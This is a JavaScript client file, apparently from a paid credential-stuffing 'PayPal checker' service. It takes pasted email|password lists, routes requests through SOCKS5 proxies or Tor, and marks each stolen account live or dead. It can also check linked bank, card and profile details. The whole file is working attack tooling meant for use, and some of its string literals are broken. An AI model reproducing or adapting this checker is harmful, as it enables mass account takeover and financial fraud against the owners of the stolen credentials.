/* Girudatsu Dev.
 * Ver.:	1.00
 * File:	paypal.js
 * Date:	
 * Desc:	PayPal API. Modified from http://iace.pw/stylecyb/js/acchckver.js
 * Copyright (C) 2015 Girudatsu Dev (http://girudatsu.website)
 */ 

		alert("Cannot use this script on out Site area Powered Cybus Anti Stealing © 2015 [COPYRIGHT]");
$(document).ready (function() {
	if (window["location"]["href"].indexOf ("iace.pw") > -1) {
		$(window).on ("beforeunload", function(_0x55a8x1) {
			return "Please save your data before leaving."
		})
	} else {
		alert("Cannot use this script on out Site area Powered Cybus Anti Stealing © 2015 [COPYRIGHT]");
		setTimeout(function() {
			window["location"]["href"] = "http://cyb-share.blogspot.com"
		}, 2000)
	}
});
var lstMail;
var lstSock;
var chkEmail;
var chkBank;
var chkCard;
var chkInfo;
var chkChange;
var maxFail;
var delim;
var timeout;
var WRONG_FORMAT = -1;
var SOCK_DIE = 1;
var ACC_DIE = 2;
var ACC_LIVE = 0;
var docTitle = document["title"];
$["xhrPool"] = [];
$["xhrPool"]["abortAll"] = function() {
	$(this).each (function(_0x55a8x11, _0x55a8x12) {
		_0x55a8x12.abort ()
	});
	$["xhrPool"]["length"] = 0
};
$.ajaxSetup ({
	beforeSend: function(_0x55a8x12) {
		$["xhrPool"].push (_0x55a8x12)
	},
	complete: function(_0x55a8x12) {
		var _0x55a8x13 = $["xhrPool"].indexOf (_0x55a8x12);
		if (_0x55a8x13 > -1) {
			$["xhrPool"].splice (_0x55a8x13, 1)
		}
	}
});
Array["prototype"]["remove"] = function(_0x55a8x14) {
	var _0x55a8x13 = this.indexOf (_0x55a8x14);
	if (_0x55a8x13 != -1) {
		this.splice (_0x55a8x13, 1)
	};
	return this
};

function setInputEnable(_0x55a8x16) {
	$("#socks").attr ("disabled", _0x55a8x16);
	$("#mailpass").attr ("disabled", _0x55a8x16);
	$("#info").attr ("disabled", _0x55a8x16);
	$("#delim").attr ("disabled", _0x55a8x16);
	$("#other").attr ("disabled", _0x55a8x16);
	$("#nochange").attr ("disabled", _0x55a8x16);
	$("#login").attr ("disabled", _0x55a8x16)
}

function enableTextArea(_0x55a8x16) {
	$("#socks").attr ("disabled", _0x55a8x16);
	$("#mailpass").attr ("disabled", _0x55a8x16);
	$("#info").attr ("disabled", _0x55a8x16);
	$("#delim").attr ("disabled", _0x55a8x16);
	$("#other").attr ("disabled", _0x55a8x16);
	$("#info").attr ("disabled", _0x55a8x16);
	$("#login").attr ("disabled", _0x55a8x16)
}

function tvmit_liveUp() {
	var _0x55a8x19 = parseInt($("#tvmit_live_count").html ());
	_0x55a8x19++;
	$("#tvmit_live_count").html (_0x55a8x19 + "")
}

function tvmit_dieUp() {
	var _0x55a8x19 = parseInt($("#tvmit_die_count").html ());
	_0x55a8x19++;
	$("#tvmit_die_count").html (_0x55a8x19 + "")
}

function tvmit_unkUp() {
	var _0x55a8x19 = parseInt($("#tvmit_unk_count").html ());
	_0x55a8x19++;
	$("#tvmit_unk_count").html (_0x55a8x19 + "")
}

function tvmit_failUp() {
	var _0x55a8x19 = parseInt($("#tvmit_unk_fail").html ());
	_0x55a8x19++;
	$("#tvmit_unk_fail").html (_0x55a8x19 + "")
}

function tvmit_liveUps() {
	var _0x55a8x19 = parseInt($("#tvmit_live_counts").html ());
	_0x55a8x19++;
	$("#tvmit_live_counts").html (_0x55a8x19 + "")
}

function tvmit_dieUps() {
	var _0x55a8x19 = parseInt($("#tvmit_die_counts").html ());
	_0x55a8x19++;
	$("#tvmit_die_counts").html (_0x55a8x19 + "")
}

function tvmit_unkUps() {
	var _0x55a8x19 = parseInt($("#tvmit_unk_counts").html ());
	_0x55a8x19++;
	$("#tvmit_unk_counts").html (_0x55a8x19 + "")
}

function count_all() {
	var _0x55a8x19 = parseInt($("#count_all").html ());
	_0x55a8x19++;
	$("#count_all").html (_0x55a8x19 + "")
}

function up(_0x55a8x22) {
	var _0x55a8x23 = parseInt($(_0x55a8x22).text ());
	_0x55a8x23++;
	$(_0x55a8x22).text (_0x55a8x23)
}

function stopLoading(_0x55a8x16) {
	setInputEnable(false);
	$("#loading").attr ("src", "clear.gif");
	var _0x55a8x25 = $("#FaisalTamvan").html ();
	var _0x55a8x26 = $("#checkStatus").html ();
	$("#checkStatus").html (_0x55a8x26.replace ("Checking", "Stopped"));
	enableTextArea(false);
	$("#FaisalTamvan").html (_0x55a8x25.replace ("Now", "Last"));
	$("#submit").removeClass ("disabled").attr ("disabled", false);
	$("#stop").addClass ("disabled").attr ("disabled", true);
	document["title"] = "STOPPED " + document["title"];
	if (_0x55a8x16 == true) {
		bootbox.dialog ({
			title: "Alert!",
			message: "Done",
			buttons: {
				success: {
					label: "OK",
					className: "btn-success"
				}
			}
		});
		return false
	};
	$["xhrPool"].abortAll ()
}

function isEmail(_0x55a8x28) {
	var _0x55a8x29 = /^([\w-]+(?:\.[\w-]+)*)@((?:[\w-]+\.)*\w[\w-]{0,66})\.([a-z]{2,6}(?:\.[a-z]{2})?)$/i;
	return _0x55a8x29.test (_0x55a8x28)
}

function updateTextBox(_0x55a8x2b, _0x55a8x2c) {
	if (_0x55a8x2b["length"] > 0) {
		var _0x55a8x2d = $("#mailpass").val ().split ("\x0A");
		_0x55a8x2d.remove (_0x55a8x2b);
		$("#mailpass").val (_0x55a8x2d.join ("\x0A"))
	};
	if (_0x55a8x2c["length"] > 0) {
		var _0x55a8x2e = $("#socks").val ().split ("\x0A");
		_0x55a8x2e.remove (_0x55a8x2c);
		$("#socks").val (_0x55a8x2e.join ("\x0A"))
	}
}

function updateProgress(_0x55a8x30, _0x55a8x31) {
	$(".check-amount").text ("Progress: " + _0x55a8x30 + "/" + _0x55a8x31);
	var _0x55a8x32 = Math.floor ((_0x55a8x30 / _0x55a8x31) * 100);
	$("#percentcheck").text ("Progress: " + _0x55a8x30 + "/" + _0x55a8x31 + " Total");
	$(".progress .progress-bar").css ("width", _0x55a8x32 + "%").text (_0x55a8x32 + "%");
	document["title"] = _0x55a8x32 + "% [" + _0x55a8x30 + "/" + _0x55a8x31 + "] " + docTitle
}

function check(_0x55a8x34, _0x55a8x35, _0x55a8x36) {
	if (lstMail["length"] < 1 || lstSock["length"] < 1 || _0x55a8x34 >= lstMail["length"] || _0x55a8x35 >= lstSock["length"]) {
		stopLoading(true);
		return false
	};
	if (_0x55a8x36 >= maxFail) {
		updateTextBox("", lstSock[_0x55a8x35]);
		_0x55a8x35++;
		check(_0x55a8x34, _0x55a8x35, 0);
		return false
	};
	$("#checkStatus").html ("Checking: " + lstMail[_0x55a8x34]).effect ("highlight", {
		color: "#00ff00"
	}, 1000);
	$("#FaisalTamvan").html ("Now Sock : " + lstSock[_0x55a8x35]).effect ("highlight", {
		color: "#45DFC7"
	}, 1000);
	$("#loading").attr ("src", "loading.gif");
	$.ajax ({
		url: "post.php",
		dataType: "json",
		type: "POST",
		data: "ajax=1&do=check&sock=" + encodeURIComponent(lstSock[_0x55a8x35]) + "&mailpass=" + encodeURIComponent(lstMail[_0x55a8x34]) + "&delim=" + encodeURIComponent(delim) + "&email=" + chkEmail + "&bank=" + chkBank + "&card=" + chkCard + "&info=" + chkInfo + "&timeout=" + timeout,
		success: function(_0x55a8x37) {
			if (!_0x55a8x37) {
				stopLoading(false);
				jQuery["gritter"].add ({
					title: "MESSAGE!",
					text: "Unkwnon System Happenned Please try again or contact admin",
					class_name: "growl-danger",
					sticky: false,
					time: ""
				});
				return false
			};
			if (!isNaN(_0x55a8x37["balance"])) {
				$("#blance").text (_0x55a8x37["balance"])
			};
			switch (_0x55a8x37["error"]) {
				case 9999:
					stopLoading(false);
					jQuery["gritter"].add ({
						title: "MESSAGE!",
						text: "Minimum Slackpoint Is 10 For Checking",
						class_name: "growl-danger",
						sticky: false,
						time: ""
					});
					break;
				case 9998:
					stop(false);
					jQuery["gritter"].add ({
						title: "MESSAGE!",
						text: "Your Session Hasbeen Remove Please Logged again",
						class_name: "growl-danger",
						sticky: false,
						time: ""
					});
					window["location"].replace ("../index.php");
					break;
				case WRONG_FORMAT:
					updateTextBox(lstMail[_0x55a8x34], "");
					count_all();
					tvmit_unkUp();
					tvmit_unkUps();
					$("#tvmit_unk").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
						color: "#ff0000"
					}, 1000);
					_0x55a8x34++;
					updateProgress(_0x55a8x34, lstMail["length"]);
					break;
				case SOCK_DIE:
					updateTextBox("", lstSock[_0x55a8x35]);
					tvmit_failUp();
					$("#tvmit_fail").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
						color: "#ff0000"
					}, 1000);
					_0x55a8x35++;
					break;
				case ACC_DIE:
					updateTextBox(lstMail[_0x55a8x34], "");
					$("#tvmit_die").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
						color: "#ff0000"
					}, 1000);
					count_all();
					tvmit_dieUp();
					tvmit_dieUps();
					_0x55a8x36++;
					_0x55a8x34++;
					updateProgress(_0x55a8x34, lstMail["length"]);
					break;
				case ACC_LIVE:
					updateTextBox(lstMail[_0x55a8x34], chkChange ? lstSock[_0x55a8x35] : "");
					$("#tvmit_live").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
						color: "#00ff00"
					}, 1000);
					count_all();
					tvmit_liveUp();
					tvmit_liveUps();
					_0x55a8x36 = 0;
					_0x55a8x34++;
					updateProgress(_0x55a8x34, lstMail["length"]);
					if (chkChange) {
						_0x55a8x35++
					};
					break
			};
			if (_0x55a8x37["error"] != 9999) {
				check(_0x55a8x34, _0x55a8x35, _0x55a8x36)
			}
		},
		error: function(_0x55a8x12, _0x55a8x38, _0x55a8x39) {
			if (_0x55a8x38 != "abort") {
				if (_0x55a8x38 == "error") {
					$("#tvmit_unk").append("<b style='color:red;'>Uncheck</b> | " + lstMail[_0x55a8x34] + "<br />");
					_0x55a8x34++;
					_0x55a8x35++;
					check(_0x55a8x34, _0x55a8x35, _0x55a8x36);
					return true
				};
				var _0x55a8x3a = "An Error occurred while checking:
";
				_0x55a8x3a += "- Type: " + _0x55a8x38;
				_0x55a8x3a += "
- Status: " + _0x55a8x12["status"] + " - " + _0x55a8x12["statusText"];
				var _0x55a8x28 = _0x55a8x12["responseText"];
				if (_0x55a8x28.indexOf ("on line") != -1) {
					_0x55a8x28 = _0x55a8x28.split ("on line")[1]
				};
				_0x55a8x3a += "
- Response: 
" + _0x55a8x28;
				_0x55a8x3a += "
- Message: " + _0x55a8x39;
				_0x55a8x3a += "

Please try again or contact admin for this error!";
				jQuery["gritter"].add ({
					title: "MESSAGE!",
					text: _0x55a8x3a,
					class_name: "growl-danger",
					sticky: false,
					time: ""
				});
				stopLoading(false)
			}
		}
	});
	return true
}

function filterMP(_0x55a8x2b) {
	var _0x55a8x3c = _0x55a8x2b.split ("\x0A");
	delim = $("#delim").val ().trim ();
	var _0x55a8x3d = new Array();
	var _0x55a8x3e = new Array();
	for (var _0x55a8x3f = 0; _0x55a8x3f < _0x55a8x3c["length"]; _0x55a8x3f++) {
		if (_0x55a8x3c[_0x55a8x3f].indexOf ("@") != -1) {
			var _0x55a8x40 = _0x55a8x3c[_0x55a8x3f].split (delim);
			if (_0x55a8x40["length"] < 2) {
				continue
			};
			for (var _0x55a8x41 = 0; _0x55a8x41 < _0x55a8x40["length"] - 1; _0x55a8x41++) {
				var _0x55a8x42 = $.trim (_0x55a8x40[_0x55a8x41]);
				if (isEmail(_0x55a8x42)) {
					var _0x55a8x43 = $.trim (_0x55a8x40[_0x55a8x41 + 1]);
					if ($.trim (_0x55a8x43)["length"] < 1) {
						break
					};
					if (_0x55a8x3d.indexOf (_0x55a8x42.toLowerCase ()) == -1) {
						_0x55a8x3d.push (_0x55a8x42.toLowerCase ());
						_0x55a8x3e.push (_0x55a8x42 + "|" + _0x55a8x43);
						break
					}
				}
			}
		}
	};
	$("#delim").val ("|");
	delim = "|";
	return _0x55a8x3e
}

function resetResult() {
	$("#socks-die,#acc-die,#wrong-format").html ("");
	$(".socks-die,.acc-die,.wrong-format").text ("0")
}
$(document).ready (function() {
	$("#stop").addClass ("disabled").attr ("disabled", true).click (function() {
		stopLoading(false)
	});
	$(".remove-limited").css ("cursor", "pointer").click (function() {
		$(".limited").parent ().fadeIn (100, function() {
			$(this).remove ()
		})
	});
	$("#getSocks").click (function() {
		$.ajax ({
			url: "../../assets/sock.php",
			dataType: "json",
			type: "POST",
			data: "ajax=1&delim=0&mailpass=v3ch4j",
			success: function(_0x55a8x37) {
				var _0x55a8x2e = _0x55a8x37["socks"];
				$("#socks").val (_0x55a8x2e.replace (/\,/g, "\x0A"))
			},
			error: function(_0x55a8x37, _0x55a8x45, _0x55a8x46) {
				if (_0x55a8x45 == "error") {
					bootbox.dialog ({
						title: "Alert!",
						message: "Error! Please try again or contact admin !!",
						buttons: {
							success: {
								label: "OK",
								className: "btn-success"
							}
						}
					})
				}
			}
		})
	});
	$("#submit").click (function() {
		credits = parseInt($(".user-credits").text ());
		maxFail = parseInt($("#fail").val ());
		chkEmail = $("#email").is (":checked") ? 1 : 0;
		chkBank = $("#bank").is (":checked") ? 1 : 0;
		chkCard = $("#card").is (":checked") ? 1 : 0;
		chkInfo = $("#info").is (":checked") ? 1 : 0;
		chkChange = $("#nochange").is (":checked") ? 1 : 0;
		var _0x55a8x47 = $("#checkcosock").is (":checked") ? 1 : 0;
		timeout = $("#timeout").val ();
		var _0x55a8x2d = filterMP($("#mailpass").val ());
		var _0x55a8x48 = /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}/g;
		var _0x55a8x49 = $("#socks").val ().match (_0x55a8x48);
		if (credits < 5) {
			bootbox.dialog ({
				title: "Alert!",
				message: "Minimum SlackPoint are 5. You don't have enough credits to check. !!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		if (_0x55a8x2d["length"] < 1) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Mail|Pass Found !!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		if (_0x55a8x47 === 0) {
			$("#mailpass").val (_0x55a8x2d.join ("\x0A")).attr ("disabled", true);
			$("#result").show ();
			$("#submit").addClass ("disabled").attr ("disabled", true);
			$("#stop").removeClass ("disabled").attr ("disabled", false);
			lstMail = _0x55a8x2d;
			resetResult();
			updateProgress(0, lstMail["length"]);
			$("#check-progress").show ("slow");
			_0x55a8x4a(0, 0);
			return false
		};
		if (_0x55a8x49 == null) {
			bootbox.dialog ({
				title: "Alert!",
				message: "No Sock5 Found !!",
				buttons: {
					success: {
						label: "OK",
						className: "btn-success"
					}
				}
			});
			return false
		};
		$("#socks").val (_0x55a8x49.join ("\x0A")).attr ("disabled", true);
		$("#mailpass").val (_0x55a8x2d.join ("\x0A")).attr ("disabled", true);
		$("#result").show ();
		$("#submit").addClass ("disabled").attr ("disabled", true);
		$("#stop").removeClass ("disabled").attr ("disabled", false);
		lstMail = _0x55a8x2d;
		lstSock = _0x55a8x49;
		updateProgress(0, lstMail["length"]);
		$("#check-progress").show ("slow");
		check(0, 0, 0);
		return false
	});

	function _0x55a8x4a(_0x55a8x34, _0x55a8x36) {
		if (lstMail["length"] < 1 || _0x55a8x34 >= lstMail["length"]) {
			stopLoading(true);
			return false
		};
		$("#checkStatus").html ("Checking: " + lstMail[_0x55a8x34]).effect ("highlight", {
			color: "#00ff00"
		}, 1000);
		$("#FaisalTamvan").html ("Methode Check without sock").effect ("highlight", {
			color: "#45DFC7"
		}, 1000);
		$("#loading").attr ("src", "loading.gif");
		$.ajax ({
			url: "post.php",
			dataType: "json",
			type: "POST",
			data: "ajax=1&sock=127.0.0.1:9050&mailpass=" + encodeURIComponent(lstMail[_0x55a8x34]) + "&delim=" + encodeURIComponent(delim) + "&email=" + chkEmail + "&bank=" + chkBank + "&card=" + chkCard + "&info=" + chkInfo + "&timeout=" + timeout,
			success: function(_0x55a8x37) {
				if (!_0x55a8x37) {
					stopLoading(false);
					jQuery["gritter"].add ({
						title: "MESSAGE!",
						text: "Unknown Happen To System Try Again Or Contact Admin",
						class_name: "growl-danger",
						sticky: false,
						time: ""
					});
					return false
				};
				if (!isNaN(_0x55a8x37["blance"])) {
					$("#blance").text (_0x55a8x37["blance"])
				};
				switch (_0x55a8x37["error"]) {
					case 9999:
						stopLoading(false);
						jQuery["gritter"].add ({
							title: "MESSAGE!",
							text: "Minimum Slackpoint Is 10 For Checking",
							class_name: "growl-danger",
							sticky: false,
							time: ""
						});
						break;
					case 9998:
						stopLoading(false);
						jQuery["gritter"].add ({
							title: "MESSAGE!",
							text: "Your Session Hasbeen Remove Please Logged again",
							class_name: "growl-danger",
							sticky: false,
							time: ""
						});
						window["location"].replace ("../index.php");
						break;
					case WRONG_FORMAT:
						updateTextBox(lstMail[_0x55a8x34], "");
						count_all();
						tvmit_unkUp();
						tvmit_unkUps();
						$("#tvmit_unk").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
							color: "#ff0000"
						}, 1000);
						_0x55a8x34++;
						updateProgress(_0x55a8x34, lstMail["length"]);
						break;
					case ACC_DIE:
						updateTextBox(lstMail[_0x55a8x34], "");
						$("#tvmit_die").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
							color: "#ff0000"
						}, 1000);
						count_all();
						tvmit_dieUp();
						tvmit_dieUps();
						_0x55a8x36++;
						_0x55a8x34++;
						updateProgress(_0x55a8x34, lstMail["length"]);
						break;
					case ACC_LIVE:
						updateTextBox(lstMail[_0x55a8x34], "");
						$("#tvmit_live").append (_0x55a8x37["msg"] + "<br />").effect ("highlight", {
							color: "#00ff00"
						}, 1000);
						count_all();
						tvmit_liveUp();
						tvmit_liveUps();
						_0x55a8x36 = 0;
						_0x55a8x34++;
						updateProgress(_0x55a8x34, lstMail["length"])
				};
				if (_0x55a8x37["error"] != 9999) {
					_0x55a8x4a(_0x55a8x34, _0x55a8x36)
				}
			},
			error: function(_0x55a8x12, _0x55a8x38, _0x55a8x39) {
				if (_0x55a8x38 != "abort") {
					if (_0x55a8x38 == "error") {
						$("#tvmit_unk").append ("<b style="color:red;">Uncheck</b> | " + lstMail[_0x55a8x34] + "<br />");
						_0x55a8x34++;
						check(_0x55a8x34, _0x55a8x36);
						return true
					};
					var _0x55a8x3a = "An Error occurred while checking:<br>";
					_0x55a8x3a += "- Type: " + _0x55a8x38;
					_0x55a8x3a += "<br>- Status: " + _0x55a8x12["status"] + " - " + _0x55a8x12["statusText"];
					var _0x55a8x28 = _0x55a8x12["responseText"];
					if (_0x55a8x28.indexOf ("on line") != -1) {
						_0x55a8x28 = _0x55a8x28.split ("on line")[1]
					};
					_0x55a8x3a += "<br>- Response: 
" + _0x55a8x28;
					_0x55a8x3a += "<br>- Message: " + _0x55a8x39;
					_0x55a8x3a += "<br><br>Please try again or contact admin for this error!";
					jQuery["gritter"].add ({
						title: "MESSAGE!",
						text: _0x55a8x3a,
						class_name: "growl-danger",
						sticky: false,
						time: ""
					});
					stopLoading(false)
				}
			}
		});
		return true
	}
})